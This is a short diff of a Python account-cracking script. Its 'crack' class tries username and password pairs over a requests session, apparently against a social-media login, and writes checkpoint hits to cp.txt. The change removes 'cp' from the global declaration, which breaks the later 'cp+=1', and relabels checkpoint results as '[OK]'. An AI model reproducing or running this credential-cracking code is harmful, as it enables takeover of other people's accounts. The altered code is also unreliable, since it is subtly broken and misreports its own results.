@@ -104,7 +104,7 @@ class crack:
 	
 	def __init__(self,token):self.token=token
 	def crack1(self,user,pw,ttl):
-		global ok,cp,die
+		global ok,ok,die
 		itung.append(user)
 		data={}
 		ses=req.Session()
@@ -126,7 +126,7 @@ class crack:
 		elif "checkpoint" in d.cookies:
 			cp+=1
 			open("cp.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
-			print(f"\r\x1b[1;33m[CP] {user} | {pw} | {ttl}      \x1b[0m",end="")
+			print(f"\r\x1b[1;33m[OK] {user} | {pw} | {ttl}      \x1b[0m",end="")
 			print("")
 		else:pass
 	def crack2(self,user,pw,ttl):
